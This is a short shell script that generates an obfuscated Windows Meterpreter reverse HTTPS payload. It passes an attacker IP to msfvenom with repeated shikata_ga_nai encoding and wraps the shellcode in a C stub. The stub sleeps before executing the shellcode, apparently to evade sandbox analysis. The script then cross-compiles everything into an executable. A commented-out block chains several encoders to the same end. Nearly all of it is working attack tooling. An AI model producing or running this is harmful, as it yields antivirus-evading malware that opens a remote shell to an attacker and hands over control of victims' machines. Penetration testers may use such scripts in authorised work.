echo "Script to generate Windows reverse HTTP payload..."


if [ -z "$1" ]; then 
    echo "Usage: sudo $0 <ip>"
    exit
fi

if [ `id -u` -gt 0 ]; then
   echo "Sorry, you need to run this as w00t."
   exit
fi

#msfpayload windows/meterpreter/reverse_http LHOST=$1 LPORT=8080  R | \
#msfencode -e x86/alpha_upper    -c 1 -t raw | \
#msfencode -e x86/shikata_ga_nai -c 4 -t raw | \
#msfencode -e x86/alpha_upper    -c 1 -t raw | \
#msfencode -e x86/shikata_ga_nai -c 6 -t raw | \
#msfencode -e x86/countdown      -c 5 -t raw -t exe -o payload_$1.exe

payback=`mktemp`
payback=$payback.c

cat > $payback << EOF
#include <stdio.h>
#include <windows.h>

void show_me(){
    int i = 1000 * 60 * 2;
    printf("You never know what you are going to get\n");
    Sleep(i);



}

int main(int argc, char **argv)
{



EOF

msfvenom -p windows/meterpreter/reverse_https LHOST=$1 LPORT=443 -e x86/shikata_ga_nai -i 11 -t npp.exe -f c >> $payback


cat >> $payback << EOF

    show_me();

    int (*func)();
    func = (int (*)()) buf;
    (int)(*func)();
}

EOF

i586-mingw32msvc-gcc -o payload_$1.exe $payback


echo "Done! Created payload_$1.exe"
